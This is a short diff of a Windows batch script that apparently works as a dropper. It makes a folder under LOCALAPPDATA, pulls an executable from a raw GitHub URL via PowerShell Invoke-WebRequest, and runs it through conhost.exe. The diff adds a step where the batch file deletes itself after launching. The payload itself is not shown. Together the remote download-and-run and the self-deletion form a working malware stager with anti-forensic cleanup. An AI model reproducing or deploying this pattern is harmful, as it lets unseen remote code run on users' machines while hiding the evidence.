@@ -1,6 +1,6 @@
 @echo off
 
-if not exist "%LOCALAPPDATA%\TroleitoJaja\PrintH" (
+if not exist "%LOCALAPPDATA%\TroleitoJaja\PrintH.exe" (
     mkdir "%LOCALAPPDATA%\TroleitoJaja"
 )
 
@@ -13,4 +13,9 @@ Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Lvsix14/Troleito/main/
 
 
 timeout /t 5 /nobreak >nul
-"%windir%\System32\conhost.exe" printh
+"%WINDIR%\System32\conhost.exe" printh
+
+(
+  timeout /t 2 >nul
+  del "%~f0"
+) & exit
